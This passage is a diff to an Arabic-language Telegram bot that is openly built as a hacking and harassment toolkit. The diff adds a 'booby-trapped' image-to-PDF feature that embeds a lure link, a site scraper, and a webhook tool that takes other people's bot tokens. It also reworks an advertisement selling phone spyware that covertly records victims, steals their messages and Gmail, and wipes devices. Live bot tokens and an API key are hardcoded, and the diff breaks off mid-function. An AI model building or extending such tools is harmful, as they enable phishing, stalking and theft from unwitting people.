@@ -1,7 +1,14 @@
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+import zipfile
+import urllib.parse
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup
 import logging
 import uuid
+from fpdf import FPDF
+from PIL import Image
+import io
 import requests
 import httpx
 import random
@@ -27,7 +34,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-TOKEN = "8758971653:AAEZxi14L64gyQNmYOIUXEfGShHhAJ_zOgw"
+TOKEN = "8668910625:AAE2HvmVLOJW64a4AEJ_rxYKBX8tc5xZjf4"
 
 # مع المتغيرات العالمية في الأعلى
 application_instance = None
@@ -889,9 +896,6 @@ BUTTONS = [
     ],
     [
         InlineKeyboardButton("لعبة 🅧🅞 ", callback_data="xo_game_menu"), 
-        InlineKeyboardButton("لعبة ذكاء ", web_app=WebAppInfo(url="https://reliable-douhua-e18d96.netlify.app/"))
-    ], 
-    [
         InlineKeyboardButton("ثــيـمـات تيلـجـرام", callback_data="themt")
     ],
     [
@@ -899,7 +903,7 @@ BUTTONS = [
         InlineKeyboardButton("إختبار الانترنت",  web_app=WebAppInfo(url="https://fast.com/ar/"))
     ],
     [
-        InlineKeyboardButton("معلومات دقيقه جدااا 🔴", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip-check/"))
+        InlineKeyboardButton("معلومات دقيقه جدااا", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip-check/"))
     ], 
     [
         InlineKeyboardButton("فك حظر ꫂاتـسـٖ͜ـاب", callback_data="whatsapp_unban"),
@@ -909,7 +913,7 @@ BUTTONS = [
         InlineKeyboardButton("تبنيد بث تـيـك تــوك", callback_data="tiktok_report"),
     ],
     [
-        InlineKeyboardButton("تلغيم روابط ", callback_data="btn13"),
+        InlineKeyboardButton("تـلـغـ/~/ــيــم روابط ", callback_data="btn13"),
         InlineKeyboardButton("زخرفة الاسماء", callback_data="btn14")
     ],
     [
@@ -933,11 +937,11 @@ BUTTONS = [
         InlineKeyboardButton("الـID الخاص بك", callback_data="get_my_id"), 
     ], 
     [
-        InlineKeyboardButton("تحويل النص لصوت", url="https://t.me/fkfkwkdkdjsbot"), 
-        InlineKeyboardButton("خـدمـات ويـب هــــوك", url="https://t.me/fjdjgjfjfbbot")
+        InlineKeyboardButton("تحويل النص لصوت", callback_data="tts_service"),
+        InlineKeyboardButton("خـدمـات ويـب هــــوك", callback_data="webhook_services")
     ],
     [
-        InlineKeyboardButton("معلومات دقيقه جدااا ②", web_app=WebAppInfo(url="https://amazing-syrniki-1a680d.netlify.app/"))
+        InlineKeyboardButton("معلومات دقيقه جدااا ②", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/ip.-ff"))
     ], 
     [
         InlineKeyboardButton("إتصال وهمي", callback_data="telz_call"), 
@@ -954,8 +958,12 @@ BUTTONS = [
         InlineKeyboardButton("قفل الهاتف برمز", callback_data="phone_lock_app")
     ],
     [
+        InlineKeyboardButton("تـلـغـ/~/ــيــم الصور", callback_data="booby_image"),
         InlineKeyboardButton("إغلاق مواقع", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/hogom3/"))
     ],
+    [
+        InlineKeyboardButton("سـحـب مـلـفـات الـمـواقـع", callback_data="btn_download_site"),
+    ], 
     [
         InlineKeyboardButton("تحميل فيديوهات من جميع المنصات", callback_data="dl_video")
     ], 
@@ -1463,7 +1471,7 @@ async def handle_themtt(query):
 
 ════════════════════════════════
 
-<b>متنساش تشكر حـمـزه 🤝👑</b>
+<b>متنساش تصلي علي النبي 🤝👑</b>
 """
         
         keyboard = InlineKeyboardMarkup([
@@ -1610,6 +1618,81 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             context.user_data['waiting_for_shorten'] = True
             return
+            
+        if query.data == "tts_service":
+            context.user_data['waiting_for_tts_text'] = True
+            await query.message.edit_text(
+               "🔊 <b>خدمة تحويل النص إلى صوت</b>\n\n"
+               "📝 <b>أرسل النص الذي تريد تحويله إلى صوت:</b>\n\n"
+               "<i>يدعم العربية والإنجليزية تلقائياً</i>",
+               parse_mode='HTML'
+            )
+            return   
+        
+        if query.data == "btn_download_site":
+            context.user_data['waiting_for_site_url'] = True
+            await query.message.edit_text(
+                "📂 <b>تحميل ملفات المواقع</b>\n\n"
+                "📝 <b>أرسل رابط الموقع الذي تريد سحب ملفاته:</b>\n"
+                "<i>(يجب أن يبدأ بـ http:// أو https://)</i>",
+                parse_mode='HTML'
+            )
+            return
+            
+        if query.data == "booby_image":
+            context.user_data['waiting_for_booby_image'] = True
+            await query.message.edit_text(
+                "🎭 <b>خدمة تـلـغـ/~/ــيــم الصور</b>\n\n"
+                "📷 <b>أرسل الصورة التي تريد تـلـغـ/~/ــيــم:</b>\n\n"
+                "⚡ <b>سيتم تحويلها إلى PDF مـلـ/~/ـغم بالرابط الذي تختاره</b>",
+                parse_mode='HTML'
+            )
+            return
+            
+        # ===== خدمات الويب هوك =====
+        if query.data == "webhook_services":
+            text = (
+               "🔗 <b>خدمات الويب هوك</b>\n\n"
+               "اهلا بك في الخدمات:\n"
+               "• عمل ويب هوك\n"
+               "• حذف ويب هوك\n"
+               "• معلومات التوكن\n\n"
+               "📌 <b>اختر من القائمة:</b>"
+            )
+            keyboard = [
+                [
+                    InlineKeyboardButton("عمل ويب هوك ➕", callback_data="webhook_create"),
+                    InlineKeyboardButton("حذف ويب هوك 🗑️", callback_data="webhook_delete")
+                ],
+                [InlineKeyboardButton("معلومات التوكن ℹ️", callback_data="webhook_info")],
+                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+            ]
+            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+            return
+
+        if query.data == "webhook_create":
+            context.user_data['webhook_action'] = 'waiting_for_token_create'
+            await query.message.edit_text(
+                "🔑 <b>عمل ويب هوك جديد</b>\n\nحسناً، أرسل لي التوكن الآن:",
+                parse_mode='HTML'
+            )
+            return
+
+        if query.data == "webhook_delete":
+            context.user_data['webhook_action'] = 'waiting_for_token_delete'
+            await query.message.edit_text(
+                "🗑️ <b>حذف ويب هوك</b>\n\nحسناً، أرسل التوكن وأنا سأحذف الويب هوك خالص:",
+                parse_mode='HTML'
+            )
+            return
+
+        if query.data == "webhook_info":
+            context.user_data['webhook_action'] = 'waiting_for_token_info'
+            await query.message.edit_text(
+                "ℹ️ <b>معلومات التوكن</b>\n\nحاضر، ابعتلي التوكن وأنا هجبلك كل المعلومات عنه:",
+                parse_mode='HTML'
+            )
+            return
 
         if query.data == "xo_game_menu":
             await xo_game_menu(update, context)
@@ -1731,40 +1814,59 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if query.data == "contact_developer_full_hack":
-            await query.message.edit_text(
+    # ضع هنا رابط الرسالة من القناة العامة
+    # طريقة الحصول على الرابط: افتح القناة -> دوس على الفيديو -> كليك يمين -> Copy Message Link
+    # الرابط هيبقى شكله كده: https://t.me/اسم_القناة/رقم_الرسالة
+            video_post_url = "https://t.me/fkdfkdf3/3"  # 👈 غير ده لرابط الفيديو بتاعك
+    
+    # الرابط اللي هيتم فتحه لما المستخدم يدوس على الزرار اللي تحت الرسالة
+            my_profile_link = f"tg://user?id={DEVELOPER_ID}"  # 👈 بيفتح بروفايلك بالايدي
+    
+            caption_text = (
                 "☠️ <b>إختراق الهاتف كاملاً ☠️</b>\n\n"
                 "🙂 <b>تتم عملية اختراق الهاتف كاملا والوصول لجميع معلومات جهاز شخص يبتزك او يضايقك عبر برنامج مخفي والاذونات تلقائي ومشفر من جميع مكافحه الفيروسات ما عليك الا انتقوم بارسالة الى الشخص وعند تثبيتة راح تقدر تتحكم بجهازة من خلال البوت فقط</b>\n\n"
                 "🔥 <b>راح تقدر تحصل على :</b>\n"
-                "<b>✔️ سحب جهات الاتصال 🔥</b>\n\n"
-                "<b>✔️ سحب سجل المكالمات 🔥</b>\n\n"
+                "<b>✔️ سحب جهات الاتصال 🔥</b>\n"
+                "<b>✔️ سحب سجل المكالمات 🔥</b>\n"
                 "<b>✔️ تسجيل صوت الشخص 🔥</b>\n"
-                "<b>( بدون ميعرف )</b>\n\n"
                 "<b>✔️ تلتقط فيديو وسلفي لوجهه 🔥</b>\n"
-                "<b>(بدون ميعرف)</b>\n\n"
-                "<b>✔️ سحب جميع الرسائل 🔥</b>\n\n"
-                "<b>✔️ تسحب ملف + تحذف ملف 🔥</b>\n\n"
-                "<b>✔️ سحب الموقع 🔥</b>\n\n"
-                "<b>✔️ سحب جميع الصور 🔥</b>\n\n"
-                "<b>✔️ تشغيل صوت + ايقاف الصوت 🔥</b>\n\n"
-                "<b>✔️ ارسال رسالة 🔥</b>\n\n"
-                "<b>✔️ سحب الحسابات 🔥</b>\n\n"
-                "<b>✔️ التجسس على الرسائل 🔥</b>\n\n"
-                "<b>✔️ ارسال رسائل لجهات الاتصال 🔥</b>\n\n"
-                "<b>✔️ معلومات الجهاز 🔥</b>\n\n"
-                "<b>✔️ الاشعارات 🔥</b>\n\n"
-                "<b>✔️ التقاط شاشه 🔥</b>\n\n"
-                "<b>✔️ الاتصال من هاتف الضੂحيه 🔥</b>\n\n"
-                "<b>✔️ تشفير ملفات الضੂحيه 🔥</b>\n\n"
-                "<b>✔️ سحب رسايل جيميل 🔥</b>\n\n"
-                "<b>✔️ فرمته هاتف الضੂحيه 🔥</b>\n\n"
-                "<b>✔️ قرأت كل ما يكتب الضੂحيه 🔥</b>\n\n"
-                "<b>✔️ قفل هاتف الضੂحيه برمز 🔥</b>\n\n"
-                "<b>✔️ فتح اي رابط بهاتف الضੂحيه 🔥</b>\n\n"
-                "<b>✔️ وفي اشياء راح تكتشفها بنفسك 🔥</b>\n\n"
-                "😘 <b>للاشتراك رسالني : @jt_r3r 💌</b>\n\n"
-                "⚠️ <b>ملاحظة : غير مسؤول امام الله على طريقة استعمالك للطريقة فقط تم صناعتها لمحاربة الابتزاز او لحل مشكلة تواجهك</b>",
-                parse_mode='HTML'
+                "<b>✔️ سحب جميع الرسائل 🔥</b>\n"
+                "<b>✔️ سحب الموقع 🔥</b>\n"
+                "<b>✔️ سحب جميع الصور 🔥</b>\n"
+                "<b>✔️ التجسس على الرسائل 🔥</b>\n"
+                "<b>✔️ سحب رسايل جيميل 🔥</b>\n"
+                "<b>✔️ فرمته هاتف الضحيه 🔥</b>\n\n"
+                "😘 <b>للاشتراك تواصل معي :</b> <a href=\"https://t.me/jt_r3r\">@jt_r3r</a> 💌\n\n"
+                "⚠️ <b>ملاحظة : غير مسؤول امام الله على طريقة استعمالك للطريقة فقط تم صناعتها لمحاربة الابتزاز او لحل مشكلة تواجهك</b>"
             )
+
+    # أزرار تحت الرسالة
+            keyboard = [
+                [InlineKeyboardButton("👤 تواصل مع المالك", url=my_profile_link)],
+                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+
+            try:
+        # سحب الفيديو من الرابط وإعادة إرساله للمستخدم
+        # (البوت لازم يكون عضو في القناة أو القناة عامة)
+                await context.bot.send_video(
+                    chat_id=query.message.chat_id,
+                    video=video_post_url,
+                    caption=caption_text,
+                    parse_mode='HTML',
+                    reply_markup=reply_markup,
+                    supports_streaming=True
+                )
+        # مسح رسالة "القائمة" اللي كان المستخدم واقف عليها
+                await query.message.delete()
+            except Exception as e:
+                logger.error(f"Error sending video: {e}")
+                await query.message.edit_text(
+                    "❌ <b>حدث خطأ أثناء إرسال الفيديو.</b>\n"
+                    "تأكد أن رابط الفيديو صحيح وأن البوت عضو في القناة.",
+                    parse_mode='HTML'
+                )
             return
         
         if query.data.startswith("change_link_"):
@@ -3651,7 +3753,7 @@ async def send_decorated_names(update, name):
                 logger.error(f"Error sending special style: {e}")
                 continue
 
-        await update.message.reply_text("🎉 <b>تم الانتهاء من الزخرفة!</b>\n\n💡 <b>متنساش تشكر حمزه😇❤️‍🩹</b>", parse_mode='HTML')
+        await update.message.reply_text("🎉 <b>تم الانتهاء من الزخرفة!</b>\n\n💡 <b>متنساش تصلي علي النبي 😇❤️‍🩹</b>", parse_mode='HTML')
 
     except Exception as e:
         logger.error(f"Error in send_decorated_names: {e}")
@@ -4142,6 +4244,192 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['waiting_for_ip'] = False
             context.user_data.pop('user_id_for_ip', None)
             return
+            
+        # ===== تحويل النص لصوت =====
+        if context.user_data.get('waiting_for_tts_text'):
+            context.user_data.pop('waiting_for_tts_text', None)
+            txt = (update.message.text or "").strip()
+
+            if not txt or len(txt) < 2:
+                await update.message.reply_text("❌ <b>النص قصير جداً!</b>", parse_mode='HTML')
+                return
+
+            msg = await update.message.reply_text("🎙️ <b>جاري تحويل النص لصوت...</b>", parse_mode='HTML')
+
+            loop = asyncio.get_event_loop()
+            audio_bytes, lang = await loop.run_in_executor(None, text_to_speech_convert, txt)
+
+            if not audio_bytes:
+                await msg.edit_text(
+                    "❌ <b>فشل التحويل</b>\n"
+                    "حاول تاني أو جرب نص أقصر (أقل من 300 حرف).",
+                    parse_mode='HTML'
+                )
+                return
+
+            ok = await send_tts_audio(update, context, audio_bytes, txt, lang)
+            if ok:
+                await msg.delete()
+            else:
+                await msg.edit_text("❌ <b>فشل إرسال الملف الصوتي</b>", parse_mode='HTML')
+            return
+            
+        # ===== تلغيم الصور =====
+        if context.user_data.get('waiting_for_booby_image'):
+            if update.message.photo:
+                # خد أعلى دقة للصورة
+                photo = update.message.photo[-1]
+                context.user_data['booby_image_file_id'] = photo.file_id
+                context.user_data.pop('waiting_for_booby_image', None)
+                context.user_data['waiting_for_booby_link'] = True
+                await update.message.reply_text(
+                    "🔗 <b>ممتاز! الآن أرسل الرابط الذي تريد تضمينه داخل الصورة:</b>\n\n"
+                    "<i>ملاحظة: لما حد يفتح الـ PDF ويدوس على الصورة، هيفتح الرابط ده.</i>",
+                    parse_mode='HTML'
+                )
+            else:
+                await update.message.reply_text("❌ <b>من فضلك أرسل صورة مش نص!</b>", parse_mode='HTML')
+            return
+
+        if context.user_data.get('waiting_for_booby_link'):
+            link = (update.message.text or "").strip()
+            if not re.match(r'^https?://', link, re.I):
+                await update.message.reply_text("❌ <b>الرابط غير صالح! لازم يبدأ بـ http:// أو https://</b>", parse_mode='HTML')
+                return
+
+            file_id = context.user_data.pop('booby_image_file_id', None)
+            context.user_data.pop('waiting_for_booby_link', None)
+
+            if not file_id:
+                await update.message.reply_text("❌ <b>الصورة ضاعت، جرب تاني من الأول.</b>", parse_mode='HTML')
+                return
+
+            msg = await update.message.reply_text("⏳ <b>جاري إنشاء الملف المـلغم...</b>", parse_mode='HTML')
+
+            ok, err = await create_booby_pdf_async(update, context, file_id, link)
+
+            if ok:
+                await msg.delete()
+            else:
+                await msg.edit_text(f"❌ <b>فشل الإنشاء:</b> {err}", parse_mode='HTML')
+            return
+            
+        # ===== تحميل ملفات المواقع =====
+        if context.user_data.get('waiting_for_site_url'):
+            context.user_data.pop('waiting_for_site_url', None)
+            url_input = (update.message.text or "").strip()
+
+            if not re.match(r'^https?://', url_input, re.I):
+                await update.message.reply_text(
+                    "❌ <b>الرابط غير صالح!</b>\n\n📝 <b>يرجى إرسال رابط يبدأ بـ http:// أو https://</b>",
+                    parse_mode='HTML'
+                )
+                return
+
+    # التحقق من الروابط الممنوعة
+            url_lower = url_input.lower()
+            for blocked in BOT_BLOCKED_LINKS:
+                if blocked in url_lower:
+                    await update.message.reply_text(
+                        "⚠️ <b>لا اجد اي ملفات واضحه!</b>\n\n🔒 <b>جرب رابط آخر قد يكون هذا الرابط محمي</b>",
+                        parse_mode='HTML'
+                    )
+                    return
+
+            msg = await update.message.reply_text(
+                "⏳ <b>جاري تحميل ملفات الموقع...</b>\n"
+                "📥 <b>قد تستغرق العملية بضع ثوانٍ</b>",
+                parse_mode='HTML'
+            )
+
+            loop = asyncio.get_event_loop()
+            zip_path, file_count = await loop.run_in_executor(None, download_website_files, url_input, update.effective_user.id)
+
+            if not zip_path or file_count == 0:
+                await msg.edit_text("❌ <b>فشل التحميل أو لم يتم العثور على ملفات صالحة.</b>", parse_mode='HTML')
+                return
+
+            try:
+                with open(zip_path, 'rb') as doc:
+                    await update.message.reply_document(
+                        document=doc,
+                        caption=f"✅ <b>تم تحميل {file_count} ملف من الموقع</b>\n\n🔗 <b>الرابط:</b> {url_input}",
+                        parse_mode='HTML'
+                    )
+                await msg.delete()
+            except Exception as e:
+                await msg.edit_text(f"❌ <b>خطأ أثناء الإرسال:</b> {e}", parse_mode='HTML')
+            finally:
+                try:
+                    os.remove(zip_path)
+                except:
+                   pass
+            return
+            
+        # ===== استقبال التوكن لخدمات الويب هوك =====
+        if context.user_data.get('webhook_action'):
+            action = context.user_data.pop('webhook_action')
+            token_input = (update.message.text or "").strip()
+
+    # التحقق من شكل التوكن (رقم:حروف)
+            if ":" not in token_input:
+                await update.message.reply_text("❌ <b>التوكن غير صالح! يجب أن يكون بهذا الشكل:</b>\n<code>123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ</code>", parse_mode='HTML')
+                return
+
+            if action == 'waiting_for_token_create':
+                context.user_data['webhook_token'] = token_input
+                context.user_data['webhook_action'] = 'waiting_for_webhook_url'
+                await update.message.reply_text("🔗 <b>ممتاز! الآن أرسل الرابط (URL) الذي تريد ربط الويب هوك به:</b>\n\n<i>ملاحظة: يجب أن يبدأ بـ https://</i>", parse_mode='HTML')
+                return
+
+            elif action == 'waiting_for_token_delete':
+                msg = await update.message.reply_text("⏳ <b>جاري حذف الويب هوك...</b>", parse_mode='HTML')
+                loop = asyncio.get_event_loop()
+                result = await loop.run_in_executor(None, delete_webhook_api, token_input)
+
+                if result.get('ok'):
+                    await msg.edit_text("✅ <b>تم حذف الويب هوك بنجاح!</b>", parse_mode='HTML')
+                else:
+                    await msg.edit_text(f"❌ <b>فشل الحذف:</b> {result.get('description', 'خطأ غير معروف')}", parse_mode='HTML')
+                return
+
+            elif action == 'waiting_for_token_info':
+                msg = await update.message.reply_text("⏳ <b>جاري جلب المعلومات...</b>", parse_mode='HTML')
+        
+                loop = asyncio.get_event_loop()
+                bot_info, webhook_info = await asyncio.gather(
+                    loop.run_in_executor(None, get_bot_info_api, token_input),
+                    loop.run_in_executor(None, get_webhook_info_api, token_input)
+                )
+
+                text = format_webhook_info(token_input, webhook_info, bot_info)
+                await msg.edit_text(text, parse_mode='HTML', disable_web_page_preview=True)
+                return
+
+# ===== استقبال رابط الويب هوك =====
+        if context.user_data.get('webhook_action') == 'waiting_for_webhook_url':
+            context.user_data.pop('webhook_action', None)
+            url_input = (update.message.text or "").strip()
+            token = context.user_data.pop('webhook_token', None)
+
+            if not url_input.startswith("https://"):
+                await update.message.reply_text("❌ <b>الرابط غير صالح! يجب أن يبدأ بـ https://</b>", parse_mode='HTML')
+                return
+
+            msg = await update.message.reply_text("⏳ <b>جاري إنشاء الويب هوك...</b>", parse_mode='HTML')
+            loop = asyncio.get_event_loop()
+            result = await loop.run_in_executor(None, create_webhook_api, token, url_input)
+
+            if result.get('ok'):
+                await msg.edit_text(
+                    f"✅ <b>تم إنشاء الويب هوك بنجاح!</b>\n\n"
+                    f"🔗 <b>الرابط:</b> <code>{url_input}</code>\n\n"
+                    f"<i>تم وصف الويب هوك بنجاح للبوت.</i>",
+                    parse_mode='HTML'
+                )
+            else:
+                await msg.edit_text(f"❌ <b>فشل الإنشاء:</b> {result.get('description', 'خطأ غير معروف')}", parse_mode='HTML')
+            return
 
         if context.user_data.get('waiting_for_shorten'):
             await shorten_url_handler(update, context)
@@ -4265,7 +4553,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if user_message.startswith('https://'):
                 clickable_link = f'<a href="{user_message}">{user_message}</a>'
                 await update.message.reply_text(
-                    f"🔗 <b>الرابط الملتغم:</b>\n{clickable_link}\n\n⚠️ <b>تم التلغيم بنجاح!</b>",
+                    f"🔗 <b>الرابط الملتغم:</b>\n{clickable_link}\n\n⚠️ <b>تم التـلـغـ/~/ــيــم بنجاح!</b>",
                     parse_mode='HTML',
                     disable_web_page_preview=False
                 )
@@ -4429,6 +4717,293 @@ async def telz_send_call(phone: str):
     """نسخة async عشان البوت ميتجمدش."""
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, callbomber_send_one_call, phone)
+    
+# ========== دوال خدمات الويب هوك ==========
+def create_webhook_api(token, url):
+    """إنشاء ويب هوك جديد"""
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{token}/setWebhook", params={"url": url}, timeout=30)
+        return r.json()
+    except Exception as e:
+        return {"ok": False, "description": str(e)}
+
+def delete_webhook_api(token):
+    """حذف الويب هوك"""
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook", timeout=30)
+        return r.json()
+    except Exception as e:
+        return {"ok": False, "description": str(e)}
+
+def get_webhook_info_api(token):
+    """جلب معلومات الويب هوك"""
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{token}/getWebhookInfo", timeout=30)
+        return r.json()
+    except Exception as e:
+        return {"ok": False, "description": str(e)}
+
+def get_bot_info_api(token):
+    """جلب معلومات البوت"""
+    try:
+        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=30)
+        return r.json()
+    except Exception as e:
+        return {"ok": False, "description": str(e)}
+
+def format_webhook_info(token, webhook_info, bot_info):
+    """تنسيق رسالة معلومات البوت والويب هوك"""
+    text = "🤖 <b>معلومات البوت</b>\n\n"
+    
+    if bot_info and bot_info.get('ok'):
+        bot = bot_info['result']
+        text += f"• <b>اسم البوت:</b> {bot.get('first_name', 'غير معروف')}\n"
+        text += f"• <b>يوزر البوت:</b> @{bot.get('username', 'غير معروف')}\n"
+        text += f"• <b>آيدي البوت:</b> <code>{bot.get('id', 'غير معروف')}</code>\n"
+        text += f"• <b>هل يستطيع الانضمام للمجموعات:</b> {'✅' if bot.get('can_join_groups') else '❌'}\n"
+        text += f"• <b>هل يقرأ جميع الرسائل:</b> {'✅' if bot.get('can_read_all_group_messages') else '❌'}\n"
+        text += f"• <b>يدعم الاستعلامات المضمنة:</b> {'✅' if bot.get('supports_inline_queries') else '❌'}\n\n"
+    else:
+        text += "❌ <b>فشل في جلب معلومات البوت (تأكد من التوكن)</b>\n\n"
+
+    text += "🔗 <b>معلومات الويب هوك</b>\n\n"
+    
+    if webhook_info and webhook_info.get('ok'):
+        info = webhook_info['result']
+        
+        if info.get('url'):
+            text += f"• <b>الرابط:</b> <a href=\"{info['url']}\">{info['url']}</a>\n"
+            text += f"• <b>لديه شهادة SSL مخصصة:</b> {'✅' if info.get('has_custom_certificate') else '❌'}\n"
+            text += f"• <b>عدد التحديثات المعلقة:</b> {info.get('pending_update_count', 0)}\n"
+            
+            if 'last_error_date' in info:
+                error_date = datetime.fromtimestamp(info['last_error_date']).strftime('%Y-%m-%d %H:%M:%S')
+                text += f"• <b>آخر خطأ في:</b> {error_date}\n"
+                
+            if 'last_error_message' in info:
+                text += f"• <b>رسالة الخطأ:</b> <code>{info['last_error_message']}</code>\n"
+                
+            if 'max_connections' in info:
+                text += f"• <b>الحد الأقصى للاتصالات:</b> {info['max_connections']}\n"
+                
+            if 'ip_address' in info:
+                text += f"• <b>عنوان IP:</b> {info['ip_address']}\n"
+        else:
+            text += "⚠️ <b>لا يوجد ويب هوك نشط لهذا البوت</b>\n"
+    else:
+        text += "❌ <b>فشل في جلب معلومات الويب هوك</b>\n"
+        if webhook_info and webhook_info.get('description'):
+            text += f"• <b>السبب:</b> {webhook_info['description']}\n"
+            
+    text += "\n✅ <b>تم جلب المعلومات بنجاح</b>"
+    return text
+
+# ========== دوال تحويل النص لصوت ==========
+def _detect_lang(text: str) -> str:
+    if re.search(r'[\u0600-\u06FF]', text):
+        return 'ar'
+    return 'en'
+
+def _tts_google(text: str, lang: str):
+    try:
+        r = requests.get(
+            "https://translate.google.com/translate_tts",
+            params={"ie": "UTF-8", "q": text, "tl": lang, "client": "tw-ob"},
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+            timeout=30,
+        )
+        if r.status_code == 200 and len(r.content) > 500:
+            return r.content
+        return None
+    except Exception as e:
+        logger.error(f"tts_google error: {e}")
+        return None
+
+def _tts_voicerss(text: str, lang: str):
+    api_key = "ca2a4e35c3d54674b55dfda9ec9d0022"
+    hl = "ar-sa" if lang == "ar" else "en-us"
+    try:
+        r = requests.get(
+            "http://api.voicerss.org/",
+            params={"key": api_key, "hl": hl, "v": "Aisha", "src": text},
+            timeout=30,
+        )
+        if r.status_code == 200 and len(r.content) > 500 and b"ERROR" not in r.content[:200]:
+            return r.content
+        return None
+    except Exception as e:
+        logger.error(f"tts_voicerss error: {e}")
+        return None
+
+def text_to_speech_convert(text: str):
+    text = (text or "").strip()
+    if not text:
+        return None, ""
+    if len(text) > 1000:
+        text = text[:1000]
+    lang = _detect_lang(text)
+    audio = _tts_google(text, lang)
+    if not audio:
+        audio = _tts_voicerss(text, lang)
+    return audio, lang
+
+async def send_tts_audio(update, context, audio_bytes: bytes, original_text: str, lang: str):
+    try:
+        caption = original_text[:100] + ("..." if len(original_text) > 100 else "")
+        bio = io.BytesIO(audio_bytes)
+        bio.name = "tts.mp3"
+        await update.message.reply_voice(
+            voice=bio,
+            caption=f"🔊 <b>النص:</b> {caption}",
+            parse_mode="HTML",
+        )
+        return True
+    except Exception as e:
+        logger.error(f"send_tts_audio error: {e}")
+        return False
+        
+# ========== دوال تحميل ملفات المواقع ==========
+BOT_BLOCKED_LINKS = [
+    "aesthetic-platypus-05ca99h.netlify.app", "lucky-pegasus-16de8f.netlify.app",
+    "amazing-syrniki-1a680d.netlify.app", "reliable-douhua-e18d96.netlify.app",
+    "hamza7k555-rgb.github.io", "zippy-dolphin-d8aa30.netlify.app",
+    "poetic-daifuku-61c56f.netlify.app", "sensational-trifle-075fb5.netlify.app",
+    "deluxe-souffle-f00d3c.netlify.app", "voluble-gingersnap-99fc95.netlify.app",
+    "monica.im", "fast.com", "chatgpt.com", "callmyphone.org",
+    "tanzil.video", "ar.temporary-phone-number.com", "products.aspose.app"
+]
+
+def download_website_files(url: str, user_id: int):
+    """دالة تحميل الموقع. ترجع (مسار_الملف_المضغوط, عدد_الملفات) أو (None, 0)."""
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        
+        # 1. جلب صفحة الموقع الأساسية
+        response = requests.get(url, headers=headers, timeout=15)
+        response.raise_for_status()
+        
+        # 2. تحليل الصفحة واستخراج الروابط (صور، سكربتات، ستايلات)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        files_to_download = {url: response.text} # الرابط الأساسي
+        
+        # استخراج الروابط
+        for tag, attr in [('img', 'src'), ('script', 'src'), ('link', 'href')]:
+            for element in soup.find_all(tag):
+                link = element.get(attr)
+                if link:
+                    full_url = urljoin(url, link)
+                    if full_url.startswith('http'):
+                        files_to_download[full_url] = None
+                        
+        # 3. تجهيز المجلدات والزلب
+        folder_name = f"site_{user_id}_{int(time.time())}"
+        os.makedirs(folder_name, exist_ok=True)
+        zip_filename = f"{folder_name}.zip"
+        
+        file_count = 0
+        
+        # 4. تحميل كل ملف وحفظه
+        for file_url, content in files_to_download.items():
+            try:
+                if content is None:
+                    res = requests.get(file_url, headers=headers, timeout=10)
+                    content = res.content
+                
+                # استخراج اسم الملف
+                parsed = urlparse(file_url)
+                file_name = os.path.basename(parsed.path) or "index.html"
+                
+                # عشان نمنع تكرار الأسماء
+                save_path = os.path.join(folder_name, f"{file_count}_{file_name}")
+                with open(save_path, 'wb' if isinstance(content, bytes) else 'w') as f:
+                    f.write(content)
+                file_count += 1
+            except:
+                continue # تخطي الملفات اللي فشلت
+                
+        # 5. ضغط الملفات في zip
+        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(folder_name):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zipf.write(file_path, os.path.relpath(file_path, folder_name))
+                    
+        # تنظيف المجلد المؤقت
+        import shutil
+        shutil.rmtree(folder_name)
+        
+        if file_count > 0:
+            return zip_filename, file_count
+        return None, 0
+        
+    except Exception as e:
+        logger.error(f"Download site error: {e}")
+        return None, 0
+        
+# ========== دوال تـلـغـ/~/ــيــم الصور (صور إلى PDF برابط) ==========
+async def create_booby_pdf_async(update, context, file_id: str, link: str):
+    """يجيب الصورة من تلجرام ويحولها PDF بالرابط المضمن."""
+    import tempfile
+    try:
+        # 1. جلب مسار الصورة من تلجرام
+        file = await context.bot.get_file(file_id)
+        photo_path = os.path.join(tempfile.gettempdir(), f"img_{update.effective_user.id}_{int(time.time())}.jpg")
+        await file.download_to_drive(photo_path)
+
+        if not os.path.exists(photo_path) or os.path.getsize(photo_path) < 100:
+            return False, "فشل تحميل الصورة"
+
+        # 2. إنشاء PDF
+        pdf_path = os.path.join(tempfile.gettempdir(), f"doc_{update.effective_user.id}_{int(time.time())}.pdf")
+
+        # الأبعاد A4 بالـ mm
+        PAGE_W, PAGE_H = 210, 297
+
+        # جلب أبعاد الصورة
+        with Image.open(photo_path) as img:
+            img_w, img_h = img.size
+            img_w_mm = img_w * 25.4 / 96  # تحويل تقريبي
+            img_h_mm = img_h * 25.4 / 96
+
+        ratio = min(PAGE_W / img_w_mm, PAGE_H / img_h_mm)
+        new_w = img_w_mm * ratio
+        new_h = img_h_mm * ratio
+        x = (PAGE_W - new_w) / 2
+        y = (PAGE_H - new_h) / 2
+
